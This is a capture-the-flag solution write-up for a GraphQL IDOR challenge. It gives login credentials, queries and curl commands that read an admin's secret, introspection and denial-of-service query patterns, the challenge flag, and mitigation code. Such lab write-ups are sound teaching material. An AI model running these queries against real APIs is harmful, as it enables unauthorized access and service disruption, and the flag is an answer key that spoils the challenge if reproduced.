# Challenge 18: GraphAdmin - Solution

## Vulnerability Type
**GraphQL IDOR (Insecure Direct Object Reference)**

## Description
The GraphQL API's `user(id)` query lacks authorization checks, allowing any authenticated user to query other users' data, including admin secrets.

## Vulnerable Code
```javascript
// VULNERABLE: user(id) has no authorization check
const root = {
  user: ({ id }) => users[id] || null,   // no auth check!
};
```

## Exploitation Steps

### Step 1: Login
Use credentials: `bob` / `bob123`

### Step 2: Access GraphQL Explorer
After login, you'll be redirected to `/graphql-ui`

### Step 3: Query Admin's Data
The default query shows:
```graphql
{ user(id: 2) { id username role email secret } }
```

Change the ID to `1` (admin's ID):
```graphql
{ user(id: 1) { id username role email secret } }
```

### Step 4: Get the Flag
The response will include:
```json
{
  "data": {
    "user": {
      "id": 1,
      "username": "alice",
      "role": "admin",
      "email": "alice@corp.com",
      "secret": "FCTF{gr4phql_1d0r_n0_4uth}"
    }
  }
}
```

## Alternative Methods

### Using curl
```bash
# Login first
curl -c cookies.txt -d "username=bob&password=bob123" http://[host]/login

# Query admin's data
curl -b cookies.txt -X POST http://[host]/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id username role email secret } }"}'
```

### Using GraphQL Introspection
First, discover the schema:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Query All Users (Limited Info)
```graphql
{ users { id username role email secret } }
```
Note: The `users` query hides secrets, but `user(id)` doesn't!

### Batch Query Multiple Users
```graphql
{
  user1: user(id: 1) { username secret }
  user2: user(id: 2) { username secret }
  user3: user(id: 3) { username secret }
}
```

## Flag
```
FCTF{gr4phql_1d0r_n0_4uth}
```

## How It Works
- GraphQL allows querying specific objects by ID
- The `user(id)` resolver returns user data without checking permissions
- Any authenticated user can query any other user's data
- The `users` query filters secrets, but direct `user(id)` query doesn't

## Common GraphQL Vulnerabilities

### 1. Missing Authorization
```javascript
// VULNERABLE
user: ({ id }) => users[id]

// SECURE
user: ({ id }, ctx) => {
  if (ctx.session.uid !== id && ctx.session.role !== 'admin') {
    throw new Error('Unauthorized');
  }
  return users[id];
}
```

### 2. Information Disclosure via Introspection
```graphql
{ __schema { types { name } } }
```

### 3. Batch Query DoS
```graphql
{
  u1: user(id:1){...}
  u2: user(id:2){...}
  # ... repeat 1000 times
}
```

### 4. Nested Query DoS
```graphql
{
  user(id:1) {
    friends {
      friends {
        friends {
          # deeply nested
        }
      }
    }
  }
}
```

## Mitigation

### 1. Implement Authorization
```javascript
const root = {
  user: ({ id }, context) => {
    const currentUser = context.session.uid;
    const currentRole = context.session.role;
    
    // Only allow viewing own data or admin can view all
    if (currentUser !== id && currentRole !== 'admin') {
      throw new Error('Access denied');
    }
    
    return users[id] || null;
  }
};
```

### 2. Field-Level Authorization
```javascript
const schema = buildSchema(`
  type User {
    id: Int
    username: String
    role: String
    email: String
    secret: String @auth(requires: ADMIN)
  }
`);
```

### 3. Disable Introspection in Production
```javascript
const schema = new GraphQLSchema({
  query: QueryType,
  introspection: process.env.NODE_ENV !== 'production'
});
```

### 4. Rate Limiting
```javascript
app.use('/graphql', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
}));
```

### 5. Query Complexity Analysis
```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const complexityLimit = createComplexityLimitRule(1000);
```

### 6. Depth Limiting
```javascript
const depthLimit = require('graphql-depth-limit');

const schema = new GraphQLSchema({
  query: QueryType,
  validationRules: [depthLimit(5)]
});
```

## Testing Tools
- **GraphQL Playground**: Interactive GraphQL IDE
- **Altair**: GraphQL client
- **Burp Suite**: With GraphQL extensions
- **graphql-voyager**: Schema visualization
- **InQL**: Burp extension for GraphQL

## References
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Security Best Practices](https://graphql.org/learn/best-practices/)
- [HackTricks GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
